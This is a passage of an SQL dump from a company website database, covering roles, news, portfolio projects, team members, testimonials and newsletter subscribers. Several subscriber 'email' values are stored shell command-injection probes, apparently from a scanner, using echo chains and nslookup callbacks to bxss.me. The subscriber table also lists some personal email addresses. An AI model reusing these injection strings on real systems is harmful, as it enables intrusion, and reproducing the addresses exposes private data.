CREATE TABLE `migrations` (
  `id` int(10) UNSIGNED NOT NULL,
  `migration` varchar(255) NOT NULL,
  `batch` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `migrations`
--

INSERT INTO `migrations` (`id`, `migration`, `batch`) VALUES
(1, '2014_10_12_000000_create_users_table', 1),
(2, '2014_10_12_100000_create_password_resets_table', 1),
(3, '2019_08_19_000000_create_failed_jobs_table', 1),
(4, '2019_12_14_000001_create_personal_access_tokens_table', 1),
(5, '2023_10_01_015425_create_admin_password_resets_table', 1),
(6, '2023_10_01_015425_create_admins_table', 1),
(9, '2023_10_02_223059_create_sliders_table', 2),
(10, '2023_10_03_220847_create_website_controls_table', 3),
(11, '2023_10_03_223102_create_website__controls_table', 4),
(12, '2023_10_05_191817_create_website_controls_table', 5),
(13, '2023_10_06_203531_create_testimonials_table', 6),
(14, '2023_10_07_185626_create_users_table', 7),
(15, '2023_10_07_193421_create_users_table', 8),
(16, '2023_10_11_003225_create_permission_tables', 9),
(19, '2024_05_23_073747_create_social_posts_table', 10),
(21, '2024_01_04_091732_create_fee_concessions_table', 11),
(22, '2024_03_19_061514_create_day_vendors_table', 11),
(24, '2024_07_29_052404_create_teams_table', 12),
(25, '2024_07_30_070806_create_websites_table', 13),
(26, '2024_07_30_101026_create_app_services_table', 14),
(27, '2024_07_31_064246_create_ui_services_table', 15),
(29, '2024_07_31_080346_create_cloud_services_table', 16),
(31, '2024_08_02_045642_create_portfolios_table', 17),
(32, '2024_08_02_070334_create_clients_table', 18),
(33, '2024_08_02_105446_create_industries_table', 19),
(34, '2024_08_03_135229_create_news_table', 20),
(35, '2024_08_03_153203_create_contacts_table', 21),
(36, '2024_08_03_173629_create_blogs_table', 22),
(37, '2024_08_05_072746_create_team_experiences_table', 23),
(38, '2024_08_08_043346_create_faqs_table', 23),
(39, '2024_08_08_053524_create_subscribes_table', 24),
(40, '2024_08_08_060113_create_careers_table', 25),
(41, '2024_10_07_153130_create_career_contacts_table', 26),
(42, '2025_01_31_143109_create_new_table_name_table', 26),
(43, '2025_01_31_143502_events', 26);

-- --------------------------------------------------------

--
-- Table structure for table `model_has_permissions`
--

CREATE TABLE `model_has_permissions` (
  `permission_id` bigint(20) UNSIGNED NOT NULL,
  `model_type` varchar(255) NOT NULL,
  `model_id` bigint(20) UNSIGNED NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `model_has_permissions`
--

INSERT INTO `model_has_permissions` (`permission_id`, `model_type`, `model_id`) VALUES
(2, 'App\\Models\\User', 5),
(3, 'App\\Models\\User', 5);

-- --------------------------------------------------------

--
-- Table structure for table `model_has_roles`
--

CREATE TABLE `model_has_roles` (
  `role_id` bigint(20) UNSIGNED NOT NULL,
  `model_type` varchar(255) NOT NULL,
  `model_id` bigint(20) UNSIGNED NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `news`
--

CREATE TABLE `news` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `author` varchar(50) NOT NULL,
  `title` varchar(255) NOT NULL,
  `description` varchar(255) NOT NULL,
  `image` varchar(255) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `news`
--

INSERT INTO `news` (`id`, `author`, `title`, `description`, `image`, `created_at`, `updated_at`) VALUES
(1, 'Umair', 'EMU (RAWALPINDI WOMEN UNIVERSITY FROM CHAIRMAN RAWALPINDI CHAMBER OF COMMERCE).', '<p>UMAIR AFTAB, CEO CREATIVE IT PARK (PVT) LTD. IS RECEIVING A SHIELD AT THE JOB FAIR OF RAWALPINDI WOMEN UNIVERSITY FROM THE CHAIRMAN OF RAWALPINDI CHAMBER OF COMMERCE..&nbsp;</p>', '1722693978.jpg', '2024-08-03 09:06:18', '2024-08-07 04:44:51'),
(2, 'Umair', 'MICROSOFT EXECUTIVES ABOUT MICROSOFT OFFICE SPECIALIZATION TRAINING IN PAKISTAN.', 'MEETING WITH MICROSOFT EXECUTIVES ABOUT MICROSOFT OFFICE SPECIALIZATION TRAINING IN PAKISTAN.', '1722695591.jpg', '2024-08-03 09:33:11', '2024-08-03 09:33:11'),
(3, 'Umair', 'SECRETARY HIGHER EDUCATION DEPARTMENT GOAJK', 'MEETING WITH THE SECRETARY OF HIGHER EDUCATION DEPARTMENT GOAJK.', '1722695672.jpg', '2024-08-03 09:34:32', '2024-08-03 09:34:32'),
(4, 'Umair', 'EMU (RAWALPINDI WOMEN UNIVERSITY FROM CHAIRMAN RAWALPINDI CHAMBER OF COMMERCE).', 'DISCUSSION ABOUT LATEST TECHNOLOGIES IN RAWALPINDI WOMEN UNIVERSITY(RWU)', '1722695773.jpg', '2024-08-03 09:36:13', '2024-08-03 09:36:13');

-- --------------------------------------------------------

--
-- Table structure for table `new_table_name`
--

CREATE TABLE `new_table_name` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `password_resets`
--

CREATE TABLE `password_resets` (
  `email` varchar(255) NOT NULL,
  `token` varchar(255) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `permissions`
--

CREATE TABLE `permissions` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `name` varchar(255) NOT NULL,
  `guard_name` varchar(255) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `permissions`
--

INSERT INTO `permissions` (`id`, `name`, `guard_name`, `created_at`, `updated_at`) VALUES
(2, 'Edit post a', 'web', '2023-10-12 03:00:53', '2023-10-13 07:26:57'),
(3, 'delete post', 'web', '2023-10-13 09:29:40', '2023-10-13 09:29:40'),
(4, 'show', 'web', '2023-10-17 05:22:03', '2023-10-17 05:22:03'),
(5, 'edit', 'web', '2023-10-17 05:24:38', '2023-10-17 05:24:38');

-- --------------------------------------------------------

--
-- Table structure for table `personal_access_tokens`
--

CREATE TABLE `personal_access_tokens` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `tokenable_type` varchar(255) NOT NULL,
  `tokenable_id` bigint(20) UNSIGNED NOT NULL,
  `name` varchar(255) NOT NULL,
  `token` varchar(64) NOT NULL,
  `abilities` text DEFAULT NULL,
  `last_used_at` timestamp NULL DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `portfolios`
--

CREATE TABLE `portfolios` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `heading` varchar(255) NOT NULL,
  `image` varchar(255) DEFAULT NULL,
  `type` varchar(255) DEFAULT NULL,
  `link` varchar(255) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `description` varchar(1000) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `portfolios`
--

INSERT INTO `portfolios` (`id`, `heading`, `image`, `type`, `link`, `created_at`, `updated_at`, `description`) VALUES
(1, 'Language Translation AI', 'Language translation ai.webp', 'AI', '#', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 'Advanced AI-powered language translation system providing real-time multilingual communication solutions for global businesses.'),
(2, 'LPR System AI', 'LPR System ai.webp', 'AI', '#', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 'Intelligent License Plate Recognition system using computer vision for automated vehicle identification and security applications.'),
(3, 'Lynx School', 'lynx school.webp', 'Web Application', '#', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 'Comprehensive school management platform for academic institutions featuring attendance tracking, grade management, and parent-teacher communication.'),
(4, 'Makkan', 'makkan.webp', 'websites', '#', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 'Custom website solution for Makkan featuring responsive design, content management, and seamless user experience.'),
(5, 'Market is Online', 'Market is Online website.webp', 'websites', '#', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 'Full-featured e-commerce platform with inventory management, secure payment processing, and customer relationship tools.'),
(6, 'Medical App', 'Medical app.webp', 'Mobile App', '#', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 'Mobile healthcare application enabling patient records management, appointment scheduling, and telemedicine capabilities.'),
(7, 'Mehtab Jewelry', 'Mehtab Jewllar website.webp', 'websites', '#', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 'Elegant e-commerce website for Mehtab Jewelry showcasing premium collections with secure online transactions.'),
(8, 'Mindstir Website', 'Mindstir website.webp', 'websites', '#', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 'Corporate website for Mindstir featuring service portfolios, client testimonials, and lead generation capabilities.'),
(9, 'Mindstir Portal', 'MIndstir.webp', 'Web Application', '#', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 'Custom business portal streamlining internal operations, document management, and team collaboration for Mindstir.'),
(10, 'MSGL Website', 'MSGL website.webp', 'websites', '#', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 'Digital presence solution for MSGL with modern UI/UX design, service showcases, and contact management.'),
(11, 'NIETE', 'NIETE.webp', 'Web Application', '#', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 'Education management system for NIETE institution automating administration, enrollment, and academic processes.'),
(12, 'Rawalpindi Women University', 'Rawalpindi women Univeristy.webp', 'Web Application', '#', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 'University management solution for RWU handling student information, course registration, and faculty administration.'),
(13, 'RCCI Portal', 'RCCI.webp', 'Web Application', '#', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 'Chamber of commerce portal for RCCI facilitating member services, event management, and business networking.'),
(14, 'Remote Work Tracker AI', 'Remote Work Tracker ai.webp', 'AI', '#', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 'AI-enhanced productivity monitoring solution for remote teams with task tracking and performance analytics.'),
(15, 'School Management System', 'School Management System App (1).webp', 'Mobile App', '#', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 'Mobile-first school administration platform with classroom management, timetable scheduling, and student performance tracking.'),
(16, 'SLS Website', 'SLS website.webp', 'websites', '#', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 'Business website for SLS showcasing services, portfolio highlights, and client engagement features.'),
(17, 'SLS Portal', 'SLS.webp', 'Web Application', '#', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 'Integrated business portal for SLS enabling project management, client communication, and resource allocation.'),
(18, 'Tech for Pakistan', 'Tech for Pakistan.webp', 'Web Application', '#', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 'Community platform promoting technology initiatives across Pakistan with event management and resource sharing.'),
(19, 'TheConnectx', 'TheConnectx (2).webp', 'Mobile App', '#', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 'Business networking platform facilitating professional connections, B2B opportunities, and enterprise collaboration.'),
(20, 'V7 Labs AI', 'V7 Labs ai.webp', 'AI', '#', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 'Cutting-edge AI research platform featuring data annotation tools and machine learning model development.'),
(21, 'Ark Website', 'Ark website.webp', 'websites', '#', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 'Corporate website for Ark Solutions highlighting service offerings, case studies, and industry expertise.'),
(22, 'Ark Portal', 'Ark.webp', 'Web Application', '#', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 'Custom enterprise portal for Ark Solutions optimizing internal workflows and client project management.'),
(23, 'Capital Development Authority Portal', 'CDA.webp', 'Web Application', '#', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 'Government portal solution for CDA automating public services, document processing, and citizen engagement.'),
(24, 'CIP Website', 'CIP website.webp', 'websites', '#', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 'Informational website for CIP featuring service directories, organizational information, and contact systems.'),
(25, 'CIP Portal', 'CIP.webp', 'Web Application', '#', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 'Business process automation portal for CIP enabling document control, workflow management, and reporting.'),
(26, 'Coworking Apps', 'coworking app (1).webp', 'Mobile App', '#', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 'Mobile application suite for coworking spaces featuring booking systems, access control, and community features.'),
(27, 'Coworkit Website', 'Coworkit website.webp', 'websites', '#', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 'Brand website for Coworkit showcasing facilities, membership plans, and location information.'),
(28, 'Coworkit Portal', 'coworkit portal.webp', 'Web Application', '#', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 'Comprehensive management portal for Coworkit spaces handling reservations, billing, and facility operations.'),
(29, 'Creative Agency', 'Creative Agency website.webp', 'websites', '#', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 'Portfolio website for creative agency highlighting design services, client projects, and creative team profiles.'),
(30, 'Ecommerce App', 'ecommerce app.webp', 'Mobile App', '#', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 'Mobile shopping application with product catalogs, personalized recommendations, and secure checkout.'),
(31, 'FaceSense AI', 'FaceSense AI.webp', 'AI', '#', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 'Facial recognition system providing identity verification, attendance tracking, and security authentication.'),
(32, 'Graphology Recognition AI', 'Graphology recognition ai.webp', 'AI', '#', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 'AI-powered handwriting analysis tool for personality assessment and behavioral pattern recognition.'),
(33, 'IrinaTech Digital', 'irinatech digital website.webp', 'websites', '#', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 'Technology services website for IrinaTech featuring solution portfolios and industry-specific offerings.'),
(34, 'SkillShark', 'skillshark.webp', 'websites', '#', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 'Talent development platform connecting professionals with skill-building resources and mentorship opportunities.'),
(35, 'Karobar TV', 'Karobar tv.webp', 'websites', '#', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 'Business news portal featuring market updates, financial analysis, and multimedia content delivery.');

-- --------------------------------------------------------

--
-- Table structure for table `roles`
--

CREATE TABLE `roles` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `name` varchar(255) NOT NULL,
  `guard_name` varchar(255) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `roles`
--

INSERT INTO `roles` (`id`, `name`, `guard_name`, `created_at`, `updated_at`) VALUES
(1, 'admin', 'web', '2023-10-11 07:50:50', '2023-10-11 07:50:50'),
(7, 'Cheif Executive Officer (CEO)', 'web', '2024-09-21 12:21:57', '2024-09-21 12:22:08'),
(8, 'Chief Operating Officer (COO)', 'web', '2024-09-21 12:22:30', '2024-09-21 12:22:52'),
(9, 'HR Manager', 'web', '2024-09-21 12:23:18', '2024-09-21 12:23:40'),
(10, 'Web Developer (Shift Incharge)', 'web', '2024-09-21 12:25:01', '2024-09-21 12:25:50'),
(11, 'Web Developer', 'web', '2024-09-21 12:26:00', '2024-09-21 12:26:00'),
(12, 'App Developer', 'web', '2024-09-21 12:26:14', '2024-09-21 12:26:14'),
(13, 'AI Developer', 'web', '2024-09-21 12:26:23', '2024-09-21 12:26:23'),
(14, 'Quality Assurance Expert', 'web', '2024-09-21 12:27:07', '2024-09-21 12:27:07'),
(15, 'Business Development Manager', 'web', '2024-09-21 12:28:01', '2024-09-21 12:28:01'),
(16, 'Graphic Designer', 'web', '2024-09-21 12:28:35', '2024-09-21 12:28:35'),
(17, 'Business Developer', 'web', '2024-09-21 12:29:38', '2024-09-21 12:29:38'),
(18, 'Flutter & Web Developer (Team Lead)', 'web', '2024-09-21 12:46:27', '2024-09-21 12:48:34'),
(19, 'Backend Technology Team Lead ', 'web', NULL, NULL),
(20, 'Backend Team Lead ', 'web', NULL, NULL),
(21, 'Chief Technology Officer (CTO)', 'web', '2026-03-19 08:18:15', '2026-03-19 08:18:15');

-- --------------------------------------------------------

--
-- Table structure for table `role_has_permissions`
--

CREATE TABLE `role_has_permissions` (
  `permission_id` bigint(20) UNSIGNED NOT NULL,
  `role_id` bigint(20) UNSIGNED NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `sliders`
--

CREATE TABLE `sliders` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `title` varchar(255) NOT NULL,
  `tags` varchar(255) NOT NULL,
  `image` varchar(255) DEFAULT NULL,
  `discription` varchar(255) NOT NULL,
  `link1` varchar(255) NOT NULL,
  `link2` varchar(255) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `sliders`
--

INSERT INTO `sliders` (`id`, `title`, `tags`, `image`, `discription`, `link1`, `link2`, `created_at`, `updated_at`) VALUES
(1, 'Creative IT Park', 'Laravel,Php,React', 'images/1696365875.jpg', 'tweyehurturutyiytiyti', 'https://creativeitpark.org/', 'https://creativeitpark.org/', '2023-10-04 03:44:35', '2023-10-04 03:44:35'),
(3, 'Creative IT Park', 'Laravel, Php , React', 'images/1696370235.jpg', 'geherjherjtnretjtrjrshre', 'https://creativeitpark.org/', 'https://creativeitpark.org/', '2023-10-04 04:57:15', '2023-10-04 04:57:15');

-- --------------------------------------------------------

--
-- Table structure for table `social_posts`
--

CREATE TABLE `social_posts` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `subscribes`
--

CREATE TABLE `subscribes` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `email` varchar(255) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `subscribes`
--

INSERT INTO `subscribes` (`id`, `email`, `created_at`, `updated_at`) VALUES
(1, 'admin@example.com', '2024-08-08 00:40:25', '2024-08-08 00:40:25'),
(2, 'demo@creativeitpark.org', '2024-08-08 01:04:05', '2024-08-08 01:04:05'),
(3, 'aliashah0101@gmail.com', '2024-10-09 02:31:55', '2024-10-09 02:31:55'),
(4, 'aliashah1@gmail.com', '2024-10-09 05:01:00', '2024-10-09 05:01:00'),
(5, 'bismullahwafadar5@gmail.com', '2024-11-02 09:32:24', '2024-11-02 09:32:24'),
(6, 'sample@email.tst', '2025-03-14 19:13:05', '2025-03-14 19:13:05'),
(9, 'echo qjeqsq$()\\ ysobwv\\nz^xyu||a #\' &echo qjeqsq$()\\ ysobwv\\nz^xyu||a #|\" &echo qjeqsq$()\\ ysobwv\\nz^xyu||a #', '2025-03-14 19:17:04', '2025-03-14 19:17:04'),
(10, '&echo cuuhjk$()\\ bnibwu\\nz^xyu||a #\' &echo cuuhjk$()\\ bnibwu\\nz^xyu||a #|\" &echo cuuhjk$()\\ bnibwu\\nz^xyu||a #', '2025-03-14 19:17:06', '2025-03-14 19:17:06'),
(11, '|echo lexdpz$()\\ akpliz\\nz^xyu||a #\' |echo lexdpz$()\\ akpliz\\nz^xyu||a #|\" |echo lexdpz$()\\ akpliz\\nz^xyu||a #', '2025-03-14 19:17:07', '2025-03-14 19:17:07'),
(12, '(nslookup hitndgsolzvyx803b0.bxss.me||perl -e \"gethostbyname(\'hitndgsolzvyx803b0.bxss.me\')\")', '2025-03-14 19:17:08', '2025-03-14 19:17:08'),
(13, '$(nslookup hitdihljlxoxb9636d.bxss.me||perl -e \"gethostbyname(\'hitdihljlxoxb9636d.bxss.me\')\")', '2025-03-14 19:17:09', '2025-03-14 19:17:09'),
(14, '&(nslookup hitjfxaxakzoqe6717.bxss.me||perl -e \"gethostbyname(\'hitjfxaxakzoqe6717.bxss.me\')\")&\'\\\"`0&(nslookup hitjfxaxakzoqe6717.bxss.me||perl -e \"gethostbyname(\'hitjfxaxakzoqe6717.bxss.me\')\")&`\'', '2025-03-14 19:17:22', '2025-03-14 19:17:22'),
(16, '|(nslookup hitldlzymujlz5ddd3.bxss.me||perl -e \"gethostbyname(\'hitldlzymujlz5ddd3.bxss.me\')\")', '2025-03-14 19:17:24', '2025-03-14 19:17:24'),
(17, '`(nslookup hitgjxasbmtda91a7b.bxss.me||perl -e \"gethostbyname(\'hitgjxasbmtda91a7b.bxss.me\')\")`', '2025-03-14 19:17:25', '2025-03-14 19:17:25');

-- --------------------------------------------------------

--
-- Table structure for table `teams`
--

CREATE TABLE `teams` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `name` varchar(255) NOT NULL,
  `image` varchar(255) NOT NULL,
  `status` int(11) NOT NULL,
  `roll_id` bigint(20) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `deleted_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `teams`
--

INSERT INTO `teams` (`id`, `name`, `image`, `status`, `roll_id`, `created_at`, `updated_at`, `deleted_at`) VALUES
(1, 'Hakeem', '1722838650.jpg', 1, 2, '2024-07-29 01:52:51', '2024-09-21 12:17:46', '2024-09-21 12:17:46'),
(2, 'Three', '', 1, 6, '2024-07-29 01:54:04', '2024-09-21 12:17:41', '2024-09-21 12:17:41'),
(3, 'user', '1722316510.jpg', 1, 5, '2024-07-30 00:15:10', '2024-09-21 12:17:37', '2024-09-21 12:17:37'),
(4, 'Umair Aftab', '1726929827.jpg', 1, 7, '2024-09-21 12:43:47', '2024-09-21 12:43:47', NULL),
(5, 'Uzair Aftab', '1726929876.jpg', 1, 8, '2024-09-21 12:44:36', '2024-09-21 12:44:36', NULL),
(6, 'Rooba Ahmad', '', 1, 18, '2024-09-21 12:47:07', '2024-09-21 12:48:55', '2024-09-21 12:48:55'),
(7, 'Sidra Hussain', '1729659013.jpg', 0, 9, '2024-09-21 12:50:03', '2025-02-28 03:50:59', NULL),
(8, 'Shumaila Khalil', '1726930233.png', 1, 9, '2024-09-21 12:50:33', '2024-10-23 02:46:57', NULL),
(9, 'Abdul Hakeem Khan', '1726930289.jpg', 1, 19, '2024-09-21 12:51:29', '2024-09-21 12:51:29', NULL),
(10, 'Jahanzaib Ali', 'jahanzaibimg.png', 1, 20, '2024-09-21 12:51:33', '2024-10-22 17:51:51', NULL),
(11, 'M. Arslan Alvi', '1726930845.png', 1, 15, '2024-09-21 13:00:45', '2024-09-21 13:00:45', NULL),
(12, 'Ahmed Yousafzai', '1726930895.png', 1, 17, '2024-09-21 13:01:35', '2024-09-21 13:01:35', NULL),
(13, 'Ahmed Yousafzai', '1726930897.png', 1, 17, '2024-09-21 13:01:37', '2024-09-21 13:01:54', '2024-09-21 13:01:54'),
(14, 'Abdul Baseer', '1726930949.png', 1, 16, '2024-09-21 13:02:29', '2024-09-21 13:02:29', NULL),
(15, 'Saqib Zareen', '1726930982.jpg', 1, 14, '2024-09-21 13:03:02', '2024-09-21 13:03:02', NULL),
(16, 'M. Saad Kamran', '1726931019.png', 1, 14, '2024-09-21 13:03:39', '2024-09-21 13:03:39', NULL),
(17, 'Haseeb Tariq', '1726931069.jpg', 1, 11, '2024-09-21 13:04:29', '2024-09-21 13:04:29', NULL),
(18, 'Areej Shafiq', '1726931115.png', 1, 11, '2024-09-21 13:05:15', '2024-09-21 13:05:15', NULL),
(19, 'M. Younis', '1726931177.jpg', 1, 12, '2024-09-21 13:06:17', '2024-09-21 13:06:17', NULL),
(20, 'M. Roman Raja', '1726931217.png', 1, 12, '2024-09-21 13:06:57', '2024-09-21 13:06:57', NULL),
(21, 'Yaldram Khan', '1726931249.png', 1, 13, '2024-09-21 13:07:29', '2024-09-21 13:07:29', NULL),
(22, 'Muhammad Ali', '1726931290.png', 1, 11, '2024-09-21 13:08:10', '2024-09-21 13:08:10', NULL),
(23, 'Zeeshan Haider', '1726931390.png', 1, 11, '2024-09-21 13:09:50', '2024-09-21 13:09:50', NULL),
(24, 'M. Hassan', '1726931425.png', 1, 11, '2024-09-21 13:10:25', '2024-09-21 13:10:25', NULL),
(25, 'Saliha Zameer', '1729626545.png', 1, 17, '2024-10-22 17:49:05', '2024-10-23 02:47:42', NULL),
(26, 'Komal Shahzadi', '1729626620.png', 1, 17, '2024-10-22 17:50:20', '2024-10-23 02:47:58', NULL),
(27, 'Ghazi ul hassan', '1759941526.jpg', 1, 17, '2025-10-08 14:38:46', '2025-10-08 14:38:46', NULL),
(28, 'Kafil Ahmed', '1773911936.jpg', 1, 21, '2026-03-19 08:18:56', '2026-03-19 08:18:56', NULL);

-- --------------------------------------------------------

--
-- Table structure for table `team_experiences`
--

CREATE TABLE `team_experiences` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `roll_id` bigint(20) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `testimonials`
--

CREATE TABLE `testimonials` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `name` varchar(255) NOT NULL,
  `detail` varchar(255) NOT NULL,
  `subject` varchar(255) NOT NULL,
  `image` varchar(255) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `testimonials`
--

INSERT INTO `testimonials` (`id`, `name`, `detail`, `subject`, `image`, `created_at`, `updated_at`) VALUES
(4, 'MINDSTIR', 'Creative IT Park has truly revolutionized our workspace management. Their Coworking Management System has streamlined our operations, allowing us to focus on what matters most—our members. The system is intuitive, efficient, and has transformed the way we', '', NULL, NULL, NULL),
(5, 'The Lynx School', 'Thanks to Creative IT Park, our school\'s administrative processes have become significantly more efficient. The ERP system they implemented has transformed our academic management, allowing us to handle everything from student records to faculty schedules', '', NULL, NULL, NULL),
(6, 'Sadeeqa\'s Learning Center', 'Creative IT Park’s Exemplary Management System has been a game-changer for us. From simplifying administrative tasks to streamlining academic processes, it’s made everything more organized. Their support has been excellent, and we’re excited to see how th', '', NULL, NULL, NULL),
(7, 'Rawalpindi Women University', 'The Technology Management Classes offered by Creative IT Park have empowered our students with essential skills to thrive in the digital world. The hands-on training and expert guidance provided by their instructors have given our students the knowledge t', '', NULL, NULL, NULL),
(8, 'Taleem A Bad', 'Creative IT Park’s Learning Management System has enhanced our educational offerings and improved the learning experience for our students. The platform is user-friendly, and the support team has been incredibly responsive. We are thrilled with the positi', '', NULL, NULL, NULL),
(9, 'NIETE', 'The Learning Management System deployed by Creative IT Park has brought our education platform to new heights. With its seamless integration and user-friendly features, our teachers and students now have a more efficient way to interact and learn. We appr', '', NULL, NULL, NULL),
(10, 'Converge Technologies', 'Creative IT Park\'s ERP system has streamlined our operations and significantly boosted our business management efficiency. From finance to human resources, everything is now more integrated and simplified. Their team worked closely with us to tailor the s', '', NULL, NULL, NULL),
(11, 'Capital Development Authority', 'Thanks to Creative IT Park, our online presence has improved dramatically. Their Website Management System has made managing our site easier, more responsive, and more efficient. We\'ve seen noticeable improvements in user experience, and we’re excited abo', '', NULL, NULL, NULL),
(12, 'Al-Huda International School', 'Creative IT Park’s Campus Management System has been a tremendous asset to our school. It has streamlined our academic and administrative processes, allowing us to better serve our students and staff. The team at Creative IT Park has been incredibly suppo', '', NULL, NULL, NULL),
(13, 'Rawalpindi Chamber of Commerce and Industry', 'The Business Management System implemented by Creative IT Park has significantly improved our operations. It has made managing our members, coordinating events, and overseeing business activities much more efficient. The system is user-friendly, and the s', '', NULL, NULL, NULL),
(14, 'ITech For Pakistan', 'Thanks to Creative IT Park, our digital transformation journey has been seamless. The platform they implemented has boosted our CRM capabilities and streamlined internal processes, allowing us to serve our clients better. Their team’s expertise and commit', '', NULL, NULL, NULL),
(15, 'Evercare\r\n', 'The Healthcare Management System by Creative IT Park has been a game-changer for us. It has simplified patient management, improved medical record accessibility, and optimized staff coordination. The seamless integration of all systems has made our operat', '', NULL, NULL, NULL),
(16, 'Shaiq', 'Creative IT Park’s ERP system has brought remarkable improvements to our business operations. From managing inventory to streamlining sales processes, everything is now integrated and much more efficient. The system has helped us save time and reduce erro', '', NULL, NULL, NULL);

-- --------------------------------------------------------

--
-- Table structure for table `ui_services`
--

CREATE TABLE `ui_services` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `heading` varchar(255) NOT NULL,
  `description` varchar(1024) DEFAULT NULL,
